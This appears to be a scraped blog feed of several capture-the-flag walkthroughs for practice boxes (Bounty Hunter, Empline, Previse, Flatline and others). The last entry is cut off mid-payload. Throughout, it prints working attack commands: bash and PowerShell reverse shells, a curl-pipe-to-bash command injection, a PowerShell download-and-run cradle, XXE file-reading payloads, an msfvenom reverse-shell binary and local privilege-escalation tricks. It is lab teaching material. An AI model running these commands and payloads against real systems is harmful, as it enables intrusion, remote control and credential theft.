10.10.184.159Host is up (0.24s latency).PORT STATE SERVICE VERSION21/tcp open ftp..[snip]..Great!, FTP service was now open. Trying for anonymous access and we were in. It had a note.txt stating:In case I forget my password, I'm leaving a pointer to the internal shell service on the server. Connect to port 4420, the password is sardinethecat. - catloverPORT 4420Interacting with this port using nc, prompt us for password. We have a password from previous note file using which,it gives us a basic shell. This shell had limited functionality.Poking around, we found a file named runme in /home/catlover. To run this we need a better shell than this.# Victimecho \"bash -i &gt;&amp; /dev/tcp/ourIP/port 0&gt;&amp;1\" | bash# attackernc -lvnp 9991We now have a better shell. Running the executable, asks us for another password. Trying the previous one we found but it didn’t worked. There was no strings binary available on the box,so we need to transfer this runme file to our box.# Attackernc -lvnp 9991 &gt; runme# Victimcat runme &gt; /dev/tcp/ourIP/9991We have the file on our local machine.Running strings on it, foundrebeccaPlease enter yout password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyRunning the file on victim shell with the string we found worked. Waiting for few seconds we have a ssh private key file for catlover. Using this, we can ssh into the box.ROOTAfter gaining the shell, we were already root but we were in a docker-environment.root@7546fa2336d6:/root# ls -latotal 24drwx------ 1 root root 4096 Mar 25 16:28 .drwxr-xr-x 1 root root 4096 Mar 25 16:18 ..-rw-r--r-- 1 root root 570 Jan 31 2010 .bashrcdrwxr-xr-x 3 root root 4096 Mar 25 16:26 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 41 Mar 25 16:28 flag.txtLooking around we saw .bash_history. Looking at contents of the file, we foundls -alt /cat /post-init.sh cat /opt/clean/clean.sh bash -i &gt;&amp;/dev/tcp/192.168.4.20/4444 &lt;&amp;1 (?Revshell)nano /opt/clean/clean.sh We need to change the content of clean.sh to give us reverse shell.root@7546fa2336d6:/opt# echo 'bash -c \"bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1\"' &gt; clean.shSet up a listener, and wait for few seconds, we have a shell as root.ROOT!!!" }, { "title": "Bounty Hunter", "url": "/posts/BountyHunter/", "categories": "Linux, Hackthebox", "tags": "Linux, Hackthebox", "date": "2022-09-13 02:30:00 +0530", "snippet": "EnumerationStarting with nmapNmap scan report for 10.10.11.100Host is up (0.34s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)| 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)|_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Bounty HuntersService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 18.17 secondsLooking at results, we have port 80 and 22 open.PORT 80Looking at the webpageThe About and Contact links just lead to areas on the main page. The Portal link leads to a simple page that says it’s still under development.Clicking the link leads us to /log_submit.php which seems like a bug reporting form.Running ffuf at the backend for directory brute forcing, we foundffuf -u http://10.10.11.100/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -e .php ________________________________________________ :: Method : GET :: URL : http://10.10.11.100/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 __________________________________________ .htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10] .htaccess [Status: 403, Size: 277, Words: 20, Lines: 10] assets [Status: 301, Size: 313, Words: 20, Lines: 10] css [Status: 301, Size: 310, Words: 20, Lines: 10] db.php [Status: 200, Size: 0, Words: 1, Lines: 1] index.php [Status: 200, Size: 25169, Words: 10028, Lines: 389] index.php [Status: 200, Size: 25169, Words: 10028, Lines: 389] js [Status: 301, Size: 309, Words: 20, Lines: 10] portal.php [Status: 200, Size: 125, Words: 11, Lines: 6] resources [Status: 301, Size: 316, Words: 20, Lines: 10] server-status [Status: 403, Size: 277, Words: 20, Lines: 10]The result gave us couple of interesting files, one db.php and other resource folder.Resource folder had directory listing on which allow us to see all other files in that direcotry.# File: Readme.txtTasks:[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.[X] Write tracker submit script[ ] Connect tracker submit script to the database[X] Fix developer group permissionsAccording to the note, a login section exists, with a ‘test’ account probably existing on it. There could also be a database on the system, we can interact with.Another usefull file was bountylog.js.Checking the content of the file, we have/* File: bountylog.js */function returnSecret(data) {\treturn Promise.resolve($.ajax({ type: \"POST\", data: {\"data\":data}, url: \"tracker_diRbPr00f314.php\" }));}async function bountySubmit() {\ttry {\t\tvar xml = `&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\t\t&lt;bugreport&gt;\t\t&lt;title&gt;${$('#exploitTitle').val()}&lt;/title&gt;\t\t&lt;cwe&gt;${$('#cwe').val()}&lt;/cwe&gt;\t\t&lt;cvss&gt;${$('#cvss').val()}&lt;/cvss&gt;\t\t&lt;reward&gt;${$('#reward').val()}&lt;/reward&gt;\t\t&lt;/bugreport&gt;`\t\tlet data = await returnSecret(btoa(xml)); \t\t$(\"#return\").html(data)\t}\tcatch(error) {\t\tconsole.log('Error:', error);\t}}The /log_submit.php initiate the above code. The code makes a post requests to tracker_diRbPr00f314.php with the user input formated in XML form encoded in base64. As the code, directly take our input and forms a XML document to send to server, this might be vulnerable to XXE Injection.Navgating to /log_submit.php, submitting the values, we see our data was being sent in base64 encoded form decoding which leads to XML formatted data. First thing to try, XXE Injection. Using a simple payload to grab the passwd file and encoding it with base64, we were able to get the file.&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;\t\t&lt;bugreport&gt;\t\t&lt;title&gt;&amp;test;&lt;/title&gt;\t\t&lt;cwe&gt;1&lt;/cwe&gt;\t\t&lt;cvss&gt;1&lt;/cvss&gt;\t\t&lt;reward&gt;1&lt;/reward&gt;\t\t&lt;/bugreport&gt;We can here try to get any ssh private keys, but we were not able to in this case. From our directory bruteforcing, we found db.php, we could try to exfill that file. But to exfill PHP codes, we need to use PHP filters.Using a payload from payload-all-the-things, we can change it accordingly for our box&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/db.php'&gt;]&gt;\t\t&lt;bugreport&gt;\t\t&lt;title&gt;&amp;test;&lt;/title&gt;\t\t&lt;cwe&gt;1&lt;/cwe&gt;\t\t&lt;cvss&gt;1&lt;/cvss&gt;\t\t&lt;reward&gt;1&lt;/reward&gt;\t\t&lt;/bugreport&gt;Encode and send the request, and we got the output. Decoding the output, we have// db.php file&lt;?php// TODO -&gt; Implement login system with the database.$dbserver = \"localhost\";$dbname = \"bounty\";$dbusername = \"admin\";$dbpassword = \"m19RoAU0hP41A1sTsq6K\";$testuser = \"test\";?&gt;We have a potential password and from passwd file, we can get the usernames.root:x:0:0:root:/root:/bin/bashdevelopment:x:1000:1000:Development:/home/development:/bin/bashWe can try ssh into the box with the creds, and indeed it worked.Shell as developmentdevelopment@bountyhunter:~$ iduid=1000(development) gid=1000(development) groups=1000(development)Checking for sudo permission,development@bountyhunter:~$ sudo -lMatching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.pyThe development user have permission to run ticketValidator.py as root. Checking the script,#Skytrain Inc Ticket Validation System 0.1#Do not distribute this file.def load_file(loc): if loc.endswith(\".md\"): return open(loc, 'r') else: print(\"Wrong file type.\") exit()def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(\"# Skytrain Inc\"): return False continue if i == 1: if not x.startswith(\"## Ticket to \"): return False print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\") continue if x.startswith(\"__Ticket Code:__\"): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(\"**\"): return False ticketCode = x.replace(\"**\", \"\").split(\"+\")[0] print(ticketCode) if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(\"**\", \"\")) print(f\"validation num: {validationNumber}\") if validationNumber &gt; 100: return True else: return False return Falsedef main(): fileName = input(\"Please enter the path to the ticket file.\\n\") ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(\"Valid ticket.\") else: print(\"Invalid ticket.\") ticket.closemain()Here, the script checks few things: looks for .md extension, First row starts with “# Skytrain Inc” Second row starts with “## Ticket to “ There needs to be a line that starts with “__Ticket Code:__\" Ticket number divided by 7 should have remaineder 4Upon satisfying the above condition, its calling eval function.Eval function can be dangerous in Python.To exploit it, we need to make a markdown file satisfying all the conditions and hit the eval function to get our malicious code to execute.Our Malicious Markdown file can be created as follows:# Skytrain Inc## Ticket to abc__Ticket Code:__**11+exec('''import os;os.system('/bin/bash -p')''')Running the python script with above markdown file gave us Root shell.ROOT!!" }, { "title": "Empline", "url": "/posts/Empline/", "categories": "Linux, Tryhackme", "tags": "TryHackMe, Linux", "date": "2022-09-13 02:24:00 +0530", "snippet": "EnumerationStarting with nmapHost is up (0.17s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)| 256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)|_ 256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Empline3306/tcp open mysql MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1| mysql-info: | Protocol: 10| Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1| Thread ID: 96| Capabilities flags: 63487| Some Capabilities: SupportsLoadDataLocal, ConnectWithDatabase, ODBCClient, LongPassword, Support41Auth, Speaks41ProtocolNew, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, FoundRows, IgnoreSigpipes, LongColumnFlag, SupportsCompression, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins| Status: Autocommit| Salt: cM8nEJ&amp;yV~9&gt;l'xIDZxk|_ Auth Plugin Name: mysql_native_passwordService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 15.35 secondsLooking at the results, we have port 22, 3306 and 80.PORT 80The website seems almost static except the Employement tab which points us to job.empline.thm/careers. We need to add this subdomain to our /etc/hosts file.Looking at this subdomain, we found the webserver was running OpenCATS, which is free and open source Application Tracking System. The page also list the current openings and a apply button.Using Apply to Position button, the application allow us to upload our Resume file and other details to apply for the job.ExploitIt was exploitable in two ways:Using Uploading PHP shellAs the application was written in PHP, we can try to upload a PHP reverse shell using Resume upload functionality. Uploading the Shell and submitting the form, we recieved Resume was uploaded succesful.The application being open-source, we can easily find the complete directory structure from Github.We found /upload directory, navigating to job.empline.thm/upload, we can see our PHP shell was uploaded successfuly, using which we can get a reverse shell.Using XXEThe application was vulnerable to XXE attack as mentioned in this blogpost, where we can upload are resume.Docx file are basically zipped XML files. As the application was reading our resume.docx and extracting out the data,we can assume that its parsing the whole file to extract data from it. We can create a simple docx using the following codefrom docx import Documentdocument= Document()paragraph = document.add_paragraph(\"Rocklee\")document.save('resume.docx')Creating Malicious docxThe script created the .docx file, to modify it according to our purpose, we need to change few things in the file. For this, We need to unzip the docx file. Modify the content of word/document.xml. After first line, add following paylaod: &lt;!DOCTYPE test [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt; Save the changes Zip the file again with modified contents zip resume.docx word/document.xml Upload the file and we have the contents of passwd file.As the application was open-source, from github we found the whole directory structure. Our next task was to extract data from config.php&lt;!DOCTYPE [&lt;!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=config.php'&gt;]&gt;Using this, we found the credentials to database./* Database configuration. */ define('DATABASE_USER', 'james'); define('DATABASE_PASS', 'ng6pUFvsGNtw'); define('DATABASE_HOST', 'localhost'); define('DATABASE_NAME', 'opencats');Shell as www-dataWe got shell on the box, lets start enumerating the box. Looking at passwd file, we found other users available on the box.cat /etc/passwd | grep sh$root:x:0:0:root:/root:/bin/bashubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bashgeorge:x:1002:1002::/home/george:/bin/bashLooking at the config.php in web root folder,/* Database configuration. */ define('DATABASE_USER', 'james'); define('DATABASE_PASS', 'ng6pUFvsGNtw'); define('DATABASE_HOST', 'localhost'); define('DATABASE_NAME', 'opencats');Config file contains creds for MySQL. As from our nmap scan, we confirm that MySQL was running on the box, we can use the creds to login into MySQL.MariaDB [opencats]&gt; select * from user\\G;...[snip]...*************************** 3. row *************************** user_id: 1251 site_id: 1 user_name: george email: password: 86d0dfda99dbebc424eb4407947356ac...[snip]...The database contains a users table with password and username. The password hash was MD5 which we can easily decrypt using any online service Using crackstation, we found the password pretonnevippasempreShell as GeorgeAs we already have the password for the user, we can SSH using the creds we found on the box. Now we can read user.txt file.Running LinPeas, we found capabilities set on ruby.george@empline:/$ getcap -r / 2&gt;/dev/null /usr/bin/mtr-packet = cap_net_raw+ep/usr/local/bin/ruby = cap_chown+epRuby was having a capablity of cap_chown, This capability allow us to change owner of a file. Looking at docs, we found a way to do this in ruby which require user-id and gid to which we want to change this to.george@empline:/dev/shm$ ruby -e 'require \"fileutils\";FileUtils.chown(1002,1002,\"/root\")' george@empline:/dev/shm$ cd /root george@empline:/root$ ls -la total 36 drwx------ 4 george george 4096 Jul 20 19:52 . drwxr-xr-x 24 root root 4096 Oct 25 04:34 .. -rw------- 1 root root 5 Jul 20 19:52 .bash_history -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwxr-xr-x 3 root root 4096 Jul 20 19:49 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile drwx------ 2 root root 4096 Jul 20 19:45 .ssh -rw-r--r-- 1 root root 227 Jul 20 19:48 .wget-hsts -rw-r--r-- 1 root root 33 Jul 20 19:48 root.txt We have now changed the permission of /root directory. From here, we can either grab ssh private keys of root, or we can change the permission of shadow file and the change the root’s password.ROOT!! https://man7.org/linux/man-pages/man7/capabilities.7.html" }, { "title": "Previse", "url": "/posts/Previse/", "categories": "Linux, Hackthebox", "tags": "Linux, Hackthebox", "date": "2022-09-11 12:15:00 +0530", "snippet": "EnumerationStarting with nmapStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 00:32 ISTNmap scan report for 10.129.154.57Host is up (0.27s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)| 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)|_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.29 (Ubuntu)| http-title: Previse Login|_Requested resource was login.phpService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 20.86 secondsLooking at results, we have port 80 and 22 open.Port 80Site seems related to file storage. Trying some common username and passwords, but didn’t work. Running ffuf for brute forcing directories, we found ffuf -u http://10.10.11.104/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -e .php ________________________________________________ :: Method : GET :: URL : http://10.10.11.104/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,302________________________________________________ [Status: 302, Size: 2801, Words: 737, Lines: 72]accounts.php [Status: 302, Size: 3994, Words: 1096, Lines: 94]config.php [Status: 200, Size: 0, Words: 1, Lines: 1]download.php [Status: 302, Size: 0, Words: 1, Lines: 1]favicon.ico [Status: 200, Size: 15406, Words: 15, Lines: 10]files.php [Status: 302, Size: 6068, Words: 1995, Lines: 131]footer.php [Status: 200, Size: 217, Words: 10, Lines: 6]header.php [Status: 200, Size: 980, Words: 183, Lines: 21]index.php [Status: 302, Size: 2801, Words: 737, Lines: 72]index.php [Status: 302, Size: 2801, Words: 737, Lines: 72]login.php [Status: 200, Size: 2224, Words: 486, Lines: 54]logout.php [Status: 302, Size: 0, Words: 1, Lines: 1]logs.php [Status: 302, Size: 0, Words: 1, Lines: 1]nav.php [Status: 200, Size: 1248, Words: 462, Lines: 32]status.php [Status: 302, Size: 2971, Words: 749, Lines: 75]Most of the pages gives 302 status code. We found nav.php with status code 200, means its not redirecting to other pages. Navigating to itThe page has a option to create an account, but /account.php was redirecting to login.php. Looking at response from each page using burp, we found that on pages which gave 302 redirect were having the wole page in the respones. This vulnerability is known as Execution After redirectHere, we can skip the redirects by changing the status code from 302 Found to 200 OK. Using this knowledge, we can create a account on the site. We just need to follow these steps: Click on create account, Intercept the request Intercept the response from server Change status code from 302 to 200 OKWe now have a full working registration page, which allows us to create new account using which we can login to site.On the files page, we found a zip file named siteBackup.zip which we can download. The zip archive contained the source code of the website.Looking at config.php, we found credentials for mysql.function connectDB(){ $host = 'localhost'; $user = 'root'; $passwd = 'mySQL_p@ssw0rd!:)'; $db = 'previse'; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon;}We have the credentials, but mysql port was not open. We could try using this password and user m4lwhere (found on website footer),to login. But no success.Command InjectionLooking at other files, the logs.php file was interesting. The page allow us to download log files from server with our choice of delemiter.But the backend code was not sanitizing delim parameter, and using it directly in PHP exec() function which makes it vulnerable to Command Injection.$output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\");echo $output;Fuzzing this endpoint, we found that web app was vulnerable to blind command injection. Using delim=comma;curl 10.10.14.64:8000/test.sh|bash as delimeter, we were able to get shell on the box.Shell as www-dataLooking at running services, we found that MySQL was running. Using the previously found credentials from config.php, we can connect to MySQL.$ mysql -u root -pEnter password: mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || previse || sys |+--------------------+5 rows in set (0.00 sec)mysql&gt; use previse;mysql&gt; show tables;+-------------------+| Tables_in_previse |+-------------------+| accounts || files |+-------------------+2 rows in set (0.00 sec)The table contained hash for user m4lwherem4lwhere: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.We can crack the hash either by using Hashcat or John the Ripper.hashcat -m 500 hash /usr/share/wordlists/rockyou.txt$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235! Session..........: hashcatStatus...........: CrackedHash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)Hash.Target......: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.Time.Started.....: Sun Aug 8 16:48:10 2021 (19 mins, 13 secs)Time.Estimated...: Sun Aug 8 17:07:23 2021 (0 secs)Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 5293 H/s (11.51ms) @ Accel:32 Loops:500 Thr:1 Vec:8Recovered........: 1/1 (100.00%) DigestsProgress.........: 7413376/14344385 (51.68%)Rejected.........: 0/7413376 (0.00%)Restore.Point....: 7413248/14344385 (51.68%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:500-1000Candidates.#1....: ilovecody98 -&gt; ilovecloandliveyWe can ssh into the box using the credentials.ROOTChecking sudo permissionsm4lwhere@previse:~$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.shLooking at the scriptm4lwhere@previse:~$ cat /opt/scripts/access_backup.sh #!/bin/bash# We always make sure to store logs, we take security SERIOUSLY here# I know I shouldnt run this as root but I cant figure it out programmatically on my account# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's timegzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_access.gzgzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_file_access.gzThe script was used to make backup, but it was using gzip without complete path which makes it vulnerable to PATH Injection.Exploiting PATH InjectionTo exploit it, Lets create a malicious script in tmp folder.Script will be used to set suid bit on bash. After which, add /tmp to our path, and executing the scriptm4lwhere@previse:/tmp$ cat gzip chmod +xs /bin/bashm4lwhere@previse:/tmp$ chmod +x gzip m4lwhere@previse: PATH=.:$PATHm4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh m4lwhere@previse:/tmp$ ls -al /bin/bash -rwsr-sr-x 1 root root 1113504 Jun 6 2019 /bin/bashm4lwhere@previse:/tmp$ bash -pbash-4.4# whoamiroot" }, { "title": "Flatline", "url": "/posts/Flatline/", "categories": "Windows, Tryhackme", "tags": "TryHackMe, Windows, Easy", "date": "2022-09-08 01:20:00 +0530", "snippet": "EnumerationStarting with nmapNmap scan report for 10.10.17.103Host is up (0.18s latency).PORT STATE SERVICE VERSION3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: WIN-EOM4PK0578N| NetBIOS_Domain_Name: WIN-EOM4PK0578N| NetBIOS_Computer_Name: WIN-EOM4PK0578N| DNS_Domain_Name: WIN-EOM4PK0578N| DNS_Computer_Name: WIN-EOM4PK0578N| Product_Version: 10.0.17763|_ System_Time: 2022-02-28T10:49:22+00:00| ssl-cert: Subject: commonName=WIN-EOM4PK0578N| Not valid before: 2021-11-08T16:47:35|_Not valid after: 2022-05-10T16:47:35|_ssl-date: 2022-02-28T10:49:23+00:00; 0s from scanner time.8021/tcp open freeswitch-event FreeSWITCH mod_event_socketService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsLooking at the results, we have port 3389(RDP) and port 8021 running Freeswitch.FreeSWITCH is a free, open-source communications server software supporting VoIP, Video chat, Text chat, and even screen sharing across multiple platforms.Looking for public exploit for this$ searchsploit freeswitchFreeSWITCH - Event Socket Command Execution (Metasploit)FreeSWITCH 1.10.1 - Command Execution ExploitationLooking at the exploit, the exploit takes CMD and ADDRESS from user. Then create a socket to the address and port. It uses default password to authenticateand use api system to run the commandsPASSWORD='ClueCon' # default password for FreeSWITCHif b'auth/request' in response: s.send(bytes('auth {}\\n\\n'.format(PASSWORD), 'utf8')) response = s.recv(1024) if b'+OK accepted' in response: print('Authenticated') s.send(bytes('api system {}\\n\\n'.format(CMD), 'utf8')) response = s.recv(8096).decode() print(response)Following the steps, we have RCE on the box.nc -nvv 10.10.53.47 8021 1 ⨯(UNKNOWN) [10.10.53.47] 8021 (zope-ftp) openContent-Type: auth/requestauth ClueConContent-Type: command/replyReply-Text: +OK acceptedapi system \"whoami\"Content-Type: api/responseContent-Length: 25win-eom4pk0578n\\nekrotic# To get reverse shellapi system \"powershell.exe IEX (new-object net.webclient).downloadstring('http://10.17.1.113:8080/rev.ps1')\"Looking at our rev.ps1$client = New-Object System.Net.Sockets.TCPClient(\"10.17.1.113\",9991);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()Enumerating a bit, looking at other users and process, we foundPS C:\\&gt; whoamiwin-eom4pk0578n\\nekroticPS C:\\&gt; net user User accounts for \\\\WIN-EOM4PK0578N-------------------------------------------------------------------------------Administrator DefaultAccount Guest Nekrotic WDAGUtilityAccount PS C:\\&gt; net user nekroticUser name NekroticLocal Group Memberships *Administrators *Users Global Group memberships *None PS C:\\&gt; tasklist /svc Image Name PID Services ========================= ======== ============================================ svchost.exe 1288 DiagTrack mysqld.exe 1464 OpenClinicMySQL tomcat8.exe 784 OpenClinicHttp svchost.exe 2060 W32Time ...[snip]...Privilege EscalationWith a little enumeration, we find there is a projects folder in the C drive. The projects folder contains another one called “openclinic”. Looking at publicexploit for the application, we found the exploit A low privilege account is able to rename mysqld.exe or tomcat8.exe files located in bin folders and replace with a malicious file that would connect back to an attacking computer giving system level privileges (nt authority\\system) due to the service running as Local System.Following the steps, we create a malicious exe using msfvenom.$ msfvenom -p windows/shell_reverse_tcp LHOST=10.17.1.113 LPORT=4000 -f exe &gt; evil.exeWe can now transfer the exe to victim machine, and rename the file.PS C:\\projects\\openclinic\\mariadb\\bin&gt; rename-item mysqld.exe -newname mysqld.bakPS C:\\projects\\openclinic\\mariadb\\bin&gt; rename-item evil.exe -newname mysqld.exePS C:\\projects\\openclinic\\mariadb\\bin&gt; shutdown /r nowSetup a listner, and we have the root shellnc -lvnp 4000 listening on [any] 4000 ... connect to [10.17.1.113] from (UNKNOWN) [10.10.53.47] 49670 Microsoft Windows [Version 10.0.17763.737] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami whoami nt authority\\system C:\\Users\\Nekrotic\\Desktop&gt;dirdir Volume in drive C has no label. Volume Serial Number is 84FD-2CC9 Directory of C:\\Users\\Nekrotic\\Desktop09/11/2021 07:39 &lt;DIR&gt; .09/11/2021 07:39 &lt;DIR&gt; ..09/11/2021 07:39 38 root.txt09/11/2021 07:39 38 user.txt 2 File(s) 76 bytes 2 Dir(s) 50,508,554,240 bytes freeC:\\Users\\Nekrotic\\Desktop&gt;type root.txttype root.txt" }, { "title": "Mustacchio", "url": "/posts/Mustacchio/", "categories": "Linux, Tryhackme", "tags": "Linux, TryHackMe, Easy", "date": "2022-09-08 00:00:00 +0530", "snippet": "EnumerationStarting with NmapStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 22:51 ISTNmap scan report for 10.10.156.81Host is up (0.25s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)| 256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)|_ 256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_/|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Mustacchio | Home8765/tcp open http nginx 1.10.3 (Ubuntu)|_http-server-header: nginx/1.10.3 (Ubuntu)|_http-title: Mustacchio | LoginService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.72 secondsAccording to nmap results, we have 3 ports open. We dont have anything for ssh, so lets start poking around at webserver.PORT 80Looking at this port, seems like its a static webpage. Running ffuf on it for directory brute-force fuf -u http://10.10.156.81/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c...[snip]... :: Method : GET :: URL : http://10.10.156.81/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403________________________________________________images [Status: 301, Size: 313, Words: 20, Lines: 10]custom [Status: 301, Size: 313, Words: 20, Lines: 10]fonts [Status: 301, Size: 312, Words: 20, Lines: 10] [Status: 200, Size: 1752, Words: 77, Lines: 73]server-status [Status: 403, Size: 277, Words: 20, Lines: 10]:: Progress: [220546/220546]_:: Job [1/1] :: 206 req/sec :: Duration: [0:17:50] :: Errors: 0 ::In the custom/js dir, we found mobile.js and users.bak. The latter file seems interesting, lets download it. Checking the file contents:0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4bThe above seems like credentials (but we dont have anything to login). The hash was SHA-1, decoding the hash, we got the password bulldog19.Port 8765We have an Admin login page. Using the credentials we found earlier, we were logged-in. The admin page says: Looking at the source code of the page//document.cookie = \"Example=/auth/dontforget.bak\"; function checktarea() { let tbox = document.getElementById(\"box\").value; if (tbox == null || tbox.length == 0) { alert(\"Insert XML Code!\") } }So it seems like we can send XML code through it. This might be vulnerable to XXE. Also in the source code, we found a file /auth/dontforget.bak. Looking at this file, it was a sample xml code that might work. First lets test it with the format in file only. It worked.Now its time to make some changes to the file and add our payload. First lets test whether the application is vulnerable to XXE or not&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE replace 